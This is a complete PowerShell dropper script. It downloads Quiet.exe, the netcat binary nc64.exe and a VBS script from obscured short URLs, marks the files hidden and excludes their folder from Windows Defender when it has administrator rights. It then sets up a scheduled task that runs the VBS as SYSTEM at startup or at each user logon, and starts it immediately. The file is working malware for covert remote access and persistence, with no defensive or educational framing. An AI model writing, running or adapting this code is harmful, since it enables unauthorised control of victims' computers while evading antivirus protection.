# Check if the script is running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Set the installation path and script.vbs URL based on privilege level
if ($isAdmin) {
    Write-Output "Running with administrative privileges"
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"
} else {
    Write-Output "Running without administrative privileges"
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn’t exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
    Write-Output "Created directory: $installPath"
}

# Define file paths
$quietExePath = Join-Path $installPath "Quiet.exe"
$nc64ExePath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for the files
$quietExeUrl = "https://rb.gy/mx0i5"
$nc64ExeUrl = "https://rb.gy/guty9"

# Download the files
try {
    Invoke-WebRequest -Uri $quietExeUrl -OutFile $quietExePath -ErrorAction Stop
    Invoke-WebRequest -Uri $nc64ExeUrl -OutFile $nc64ExePath -ErrorAction Stop
    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop
    Write-Output "Files downloaded to $installPath"
} catch {
    Write-Output "Download failed: $_"
    exit
}

# Hide the downloaded files
attrib +H $quietExePath
attrib +H $nc64ExePath
attrib +H $scriptVbsPath
Write-Output "Files hidden"

# Add Windows Defender exclusion if running with admin privileges
if ($isAdmin) {
    try {
        Add-MpPreference -ExclusionPath $installPath -ErrorAction Stop
        Write-Output "Windows Defender exclusion added for $installPath"
    } catch {
        Write-Output "Failed to add Windows Defender exclusion: $_"
    }
}

# Define the task name (unique by including username)
$taskName = "RunScriptVBS-$($env:USERNAME -replace '\s+', '')"

# Use schtasks to create the scheduled task
if ($isAdmin) {
    # For admin: Run as SYSTEM at startup
    $taskCommand = "schtasks /create /tn `"$taskName`" /tr `\"wscript.exe \`"$scriptVbsPath\`"`\" /sc onstart /ru SYSTEM /f"
} else {
    # For non-admin: Run as current user at logon
    $taskCommand = "schtasks /create /tn `"$taskName`" /tr `\"wscript.exe \`"$scriptVbsPath\`"`\" /sc onlogon /ru `"$env:USERNAME`" /f"
}

try {
    # Execute the schtasks command
    Invoke-Expression $taskCommand
    if ($LASTEXITCODE -eq 0) {
        Write-Output "Scheduled task '$taskName' has been created successfully."
        # Attempt to run the task immediately for testing (optional)
        schtasks /run /tn "$taskName"
        if ($LASTEXITCODE -eq 0) {
            Write-Output "Scheduled task started successfully."
        } else {
            Write-Output "Failed to start the task immediately, but it’s scheduled."
        }
    } else {
        Write-Output "Failed to create the scheduled task. Exit code: $LASTEXITCODE"
    }
} catch {
    Write-Output "Error creating the scheduled task: $_"
}
